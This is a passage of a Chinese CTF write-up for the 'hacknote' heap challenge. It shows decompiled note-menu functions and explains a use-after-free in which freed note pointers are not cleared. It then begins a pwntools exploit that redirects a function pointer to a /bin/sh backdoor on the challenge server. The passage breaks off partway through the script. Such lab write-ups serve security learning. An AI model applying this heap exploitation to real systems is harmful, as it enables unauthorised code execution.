punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>del_note：</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">del_note</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+8h] [ebp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">4u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v2 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> v2 <span class=\"token operator\">>=</span> count <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Out of bound!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  result <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> result <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Success\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>print_note：</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">print_note</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+8h] [ebp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">4u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v2 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> v2 <span class=\"token operator\">>=</span> count <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Out of bound!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  result <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> result <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span>__cdecl <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>add_note：</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">add_note</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// esi</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-18h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token class-name\">size_t</span> size<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+8h] [ebp-10h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  result <span class=\"token operator\">=</span> count<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> count <span class=\"token operator\">></span> <span class=\"token number\">5</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Full\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>result <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Alloca Error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> print_note_content<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Note size :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">8u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      size <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      v1 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Alloca Error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Success !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token operator\">++</span>count<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>仍然是堆的菜单题</p>\n<p>gdb 调试随便输入几个查看堆，这里是 <code>tcache</code>  应该是需要切换 glibc 版本：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPqx5E6.png\" alt=\"\" /></p>\n<p>再删除 <code>index1</code>  看看<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPqztIK.png\" alt=\"\" /></p>\n<p><code>bin:</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/01/pPqzUPO.png\" alt=\"\" /></p>\n<p>此时我们发现他的操作都是两个两个一起的，看一看地址情况</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/01/pPqzfzQ.png\" alt=\"\" /></p>\n<p>再查看一下程序产生的 0x10 的 <code>chunk</code>  的 fd 是是什么<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPLSneI.png\" alt=\"\" /></p>\n<p>这里发现是一个 <code>print_note_content</code>  函数，利用 ida 看一下<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPLSlY8.png\" alt=\"\" /></p>\n<p>反汇编，发现是一个 puts :</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">print_note_content</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a1 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>设置个断点然后运行一下<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPLSy6J.png\" alt=\"\" /><br />\n这里发现刚好会 <code>print_note_content</code>  函数断开<br />\n这里也就输出我们的内容：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPLS4fO.png\" alt=\"\" /></p>\n<p>也就是说我们调用 <code>print_not</code>  就会通过该地址值来输出内容（因为 <code>print_note</code>  中并没有打印内容的函数）<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPL9Yaq.png\" alt=\"\" /></p>\n<p>这里就知道了 <code>chunk</code>  的 fd 指向了 <code>print_note_content</code>  回去执行打印内容</p>\n<h2 id=\"2漏洞分析\"><a class=\"anchor\" href=\"#2漏洞分析\">#</a> 2. 漏洞分析</h2>\n<p>查看字符串，发现有 <code>/bin/sh</code> ：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPqx0H0.png\" alt=\"\" /></p>\n<p>跟进去看看，发现直接是个后门，没有开启 pie，所以我们可以利用：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPqxrNT.png\" alt=\"\" /></p>\n<p>这里发现 <code>delete_note函数</code> 并没有将指针置空，【错误的】 也就没有将对应的 index 号置空，也就是说，即使删除 index 后我们再次申请的 index 号仍然会增加，但是和之前删除的指向的是同一个地址</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/01/pPL95sH.png\" alt=\"\" /></p>\n<p>这里试一下将  <code>index1删除</code> ，再申请同样大小的 <code>chunk</code>  内容为 <code>www</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPLCKT1.png\" alt=\"\" /></p>\n<p>看到原本的 index1 的内容被覆盖了，现在就要想办法将上面的 <code>0x11</code>  的 <code>chunk</code>  的 fd 改写为后门函数的地址即可</p>\n<p>我们知道 size 对应的 0x11 实际 chunk 的大小为 0x8，而执行 <code>delete_note</code>  函数时会将两个一起释放，那么我们只要将释放的 <code>0x8</code>  大小的 <code>chunk</code>  从 fastbin 中回收再改写 <code>fd</code>  即可即可</p>\n<h2 id=\"3exp\"><a class=\"anchor\" href=\"#3exp\">#</a> 3.exp：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27648</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process(\"./hacknote\")</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>system_binsh<span class=\"token operator\">=</span><span class=\"token number\">0x8048945</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Note size :\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content :\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Success !\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">print_a</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#这里要加换行，不然无法成功</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   </pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"bbbb\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>add<span class=\"token punctuation\">(</span><span 